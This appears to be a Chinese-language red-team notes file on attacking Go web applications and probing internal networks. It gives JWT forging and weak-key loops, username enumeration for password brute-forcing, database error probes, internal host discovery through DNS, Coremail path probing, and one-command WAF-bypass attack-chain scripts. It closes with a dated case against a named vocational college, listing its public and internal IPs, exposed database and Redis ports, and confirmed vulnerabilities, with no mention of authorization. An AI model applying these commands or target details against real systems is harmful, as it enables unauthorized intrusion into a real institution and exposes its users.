# Go Web应用(EduManager) + 内网探测 模式库

## Go Web应用指纹识别

### 常见Go框架错误格式
```json
{"code":1002,"message":"未授权访问","error":{"code":1002,"message":"未授权访问","detail":"[1002] token解析失败: ...","file":"E:/workspace/src/ProjectName/utils/middleware.go","line":154}}
```
特征:
- `file` 字段泄露源码物理路径
- `line` 字段泄露行号
- Windows路径(E:/, C:/) → 开发环境非生产环境
- 中间件文件通常在 `utils/middleware.go` 或 `pkg/middleware/`

### Go JWT认证绕过测试
```bash
# 无签名token → "无效的签名方法"
curl -sk "URL" -H "Authorization: Bearer eyJhbG...oxfQ."

# HS256弱密钥测试
for secret in secret 123456 password admin jwt_secret key; do
  python3 -c "import hmac,hashlib,base64,json; h=base64.urlsafe_b64encode(json.dumps({'alg':'HS256','typ':'JWT'}).encode()).rstrip(b'=').decode(); p=base64.urlsafe_b64encode(json.dumps({'user':'admin','role':1,'exp':9999999999}).encode()).rstrip(b'=').decode(); s=base64.urlsafe_b64encode(hmac.new(b'$secret',f'{h}.{p}'.encode(),hashlib.sha256).digest()).rstrip(b'=').decode(); print(f'{h}.{p}.{s}')"
done
```

### 登录凭证URL明文传输模式
```
GET /api/user/login/{username}/{password}
```
- Go web框架(gin/echo)常见路由模式
- 凭证在URL路径中 → 浏览器历史/日志/Referer泄露
- 测试时直接用curl拼接即可爆破

### 用户枚举 via 登录API
```bash
# 差异化错误信息
curl -sk "https://TARGET/api/user/login/admin/test"   → "密码错误" (存在)
curl -sk "https://TARGET/api/user/login/nobody/test"  → "用户不存在" (不存在)
```
- Go后端常见: 直接返回数据库错误/业务错误
- 用此枚举有效用户名后再爆破密码

### MySQL错误信息泄露
```bash
# 注册接口返回原始MySQL错误
curl -sk -X POST https://TARGET/api/user/register -H "Content-Type: application/json" -d '{}'
→ {"Title":"注册失败","Data":"Error 1062 (23000): Duplicate entry '' for key 'PRIMARY'","Code":1001}
```
- 泄露数据库类型(MySQL/MariaDB)
- 泄露表结构(主键字段名)
- Go应用常见: 直接`err.Error()`返回给前端

## 内网资产发现 via DNS解析

当目标域名解析到内网IP时,可从外部访问内网服务:
```bash
dig +short www.sptc.edu.cn → 10.255.11.118
dig +short mail.sptc.edu.cn → 10.255.11.39
dig +short oa.sptc.edu.cn → 10.255.11.121

# 从外部直接访问内网服务
curl -sk http://10.255.11.39/  → Coremail邮件系统
curl -sk http://10.255.11.121/ → OA办公系统
```

### Coremail邮件系统探测
```bash
# 常见路径
/coremail/s?func=user:login          # 登录页
/coremail/s?func=admin:appState      # 管理状态
/coremail/s?func=user:getLocaleInfo  # 配置信息
/coremail/common/index_cmxt50.jsp    # CMXT50登录页
/coremail/XT5/index.jsp              # XT5版

# SMTP/POP3端口测试
nc -v mail.target.com 25   # SMTP
nc -v mail.target.com 110  # POP3
```

### Spring Boot Actuator + nginx反代
当Actuator端点返回301且内容是登录页面时,说明nginx做了反代保护:
```bash
# 返回301+登录页 = 被nginx拦截,不是真正暴露
curl -skL "http://TARGET/actuator/health" → 登录页HTML

# 返回200+JSON = 真正暴露!
curl -skL "http://TARGET/actuator/health" → {"status":"UP"}
```

## 红队WAF绕过工具链

位置: `/opt/redteam-toolchain/`

| 工具 | 用途 |
|------|------|
| waf-recon-bypass.py | WAF指纹识别+规则探测+绕过策略 |
| upload-capability-scanner.py | 扩展名/MIME/内容/竞争条件扫描 |
| redteam-attack-chain.py | 完整攻击链自动化 |
| waf-bypass-generator.py | 针对不同WAF的绕过字典生成 |
| quick-attack.sh | 一键部署脚本 |

```bash
# 一键完整攻击链
bash /opt/redteam-toolchain/quick-attack.sh http://TARGET

# 分步执行
python3 /opt/redteam-toolchain/waf-recon-bypass.py http://TARGET --full
python3 /opt/redteam-toolchain/upload-capability-scanner.py http://TARGET /upload
python3 /opt/redteam-toolchain/waf-bypass-generator.py sql --waf cloudflare -o /tmp/sqli.txt
```

## 2026-05-29 实战案例: sptc.edu.cn

目标: 1.95.78.227 (四川邮电职业技术学院 教学辅助系统)

### 资产
- nginx 1.21.5 + Go EduManager + Vue.js SPA
- MariaDB 10.5.22 (3306暴露) + Redis (6379暴露,需认证)
- 无WAF
- 内网: 10.255.11.39(Coremail) + 10.255.11.121(OA)

### 确认漏洞
1. **用户枚举** - 登录API差异化错误
2. **凭证URL泄露** - GET /api/user/login/{user}/{pass}
3. **MySQL错误泄露** - 注册接口返回原始SQL错误
4. **源码路径泄露** - middleware.go:154

### SQL注入信号
`admin'--` 返回"用户不存在"(而非"密码错误") → SQL注释符被解析
但UNION/布尔注入未成功 → 需要Burp手动测试

报告: /tmp/vuln_reports/sptc/scan-report.txt
